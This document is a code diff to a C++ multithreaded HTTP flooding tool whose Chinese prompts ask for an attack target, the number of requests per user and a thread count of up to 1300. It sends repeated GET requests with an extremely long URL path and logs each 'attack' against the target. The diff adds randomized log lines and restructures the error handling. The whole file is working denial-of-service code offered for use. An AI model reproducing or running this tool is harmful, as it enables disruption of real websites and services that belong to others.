@@ -9,6 +9,7 @@
 #include "EasyLib.cpp"
 #include "HttpRequests_Socket.cpp"
 #include "HttpRequests.cpp"
+#include "random.cpp"
 
 using namespace std;
 
@@ -37,52 +38,61 @@ public:
         stringstream ss;
         ss << target;
         for (int a = 0 ; a < INT16_MAX ; a++) {
-            ss << "/128318239012890312803128093812903812903812908129038109812903812938120938120938120938129038209183012983901283290";
+            ss << "/1";
         }
         auto* hr = new HttpRequests(ss.str());
 
         for (int j = 0 ; j < number ; j++) {
             hr-> GetRequest();
             attack_number += 1;
-            std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
+            if (random_bool()) {
+                std::cout << "  [ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << " " << ss.str().length() << std::endl;
+            }
+            else {
+                std::cout << "[ Thread:"+ to_string(i) + " - Number:" + to_string(attack_number) +" ] attack >> " + target << std::endl;
+            }
         }
     }
 
     void Console() {
 
-        target = input("输入你的攻击目标(IP): ");
-        string n = input(
-                "输入单个用户的攻击量: "
-        );
-        if (n == "max") {
-            isAlways = true;
-        }else {
+        try {
+            target = input("输入你的攻击目标: ");
+            string n = input(
+                    "输入单个用户的攻击量: "
+            );
+            if (n == "max") {
+                isAlways = true;
+            }else {
+                try {
+                    number = stoi(n);
+                }catch (const runtime_error& error) {
+                    std::cout << "[ERR] Your Input Error." << std::endl;
+                    return;
+                }
+            }
             try {
-                number = stoi(n);
-            }catch (const runtime_error& error) {
+                thread = stoi(input("输入模拟的用户数量: [1-1300] "));
+                if (thread > 1300 || thread < 1)
+                {
+                    std::cerr << "Your Input Error. Break the options.";
+                    return;
+                }
+            }catch (const runtime_error& error)
+            {
                 std::cout << "[ERR] Your Input Error." << std::endl;
                 return;
             }
-        }
-        try {
-            thread = stoi(input("输入模拟的用户数量: [1-1300] "));
-            if (thread > 1300 || thread < 1)
-            {
-                std::cerr << "Your Input Error. Break the options.";
+            try {
+                cout << "\n------------------------------------" << endl;
+                run_threads(thread);
+            }catch (const runtime_error& error) {
+                std::cout << "[ERR] runtime Error." << std::endl;
                 return;
             }
-        }catch (const runtime_error& error)
-        {
-            std::cout << "[ERR] Your Input Error." << std::endl;
-            return;
+            cout << "Finish Attack" << endl;
+        }catch (const runtime_error& e) {
+            cout << e.what() << endl;
         }
-        try {
-            cout << "\n------------------------------------" << endl;
-            run_threads(thread);
-        }catch (const runtime_error& error) {
-            std::cout << "[ERR] runtime Error." << std::endl;
-            return;
-        }
-        cout << "Finish Attack" << endl;
     }
 };
